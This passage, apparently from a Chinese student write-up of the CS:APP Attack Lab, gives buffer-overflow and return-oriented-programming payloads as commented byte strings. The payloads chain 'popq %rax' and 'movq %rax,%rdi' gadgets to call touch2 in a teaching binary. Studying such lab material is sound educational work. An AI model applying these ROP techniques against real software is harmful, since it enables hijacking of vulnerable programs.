...
fa 18 40 00 00 00 00 00 # %rsp+16 0x5561dc88
...
```
但是以上的solution没有用到farm中的函数来构建gadget, 所以虽然attack成功了, 但是不符合题目要求
...
19 2b 40 00 00 00 00 00  # 跳转到可以执行 popq %rax 的位置
fa 97 b9 59 00 00 00 00  # 这个值会被pop到%rax
ec 17 40 00 00 00 00 00  # 再执行c3, 把这个地方存的touch2的地址放入%rip
```
...
第一步: 我们想要的指令是popq %rdi, 但是在这里搜索, 发现根本没有popq %rdi的指令编码(5f)

只有pops %rax的指令编码 (58), 接了一个nop操作, 然后ret
...
第二步: 我们需要指令movq %rax, %rdi, ret (touch2)
...
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00  # 跳转到可以执行 popq %rax 的位置
fa 97 b9 59 00 00 00 00  # 这个值会被pop到%rax
a2 19 40 00 00 00 00 00  # ret会跳转到 movq %rax, %rdi的地址
ec 17 40 00 00 00 00 00  # 再执行ret, 就跳转touch2
```
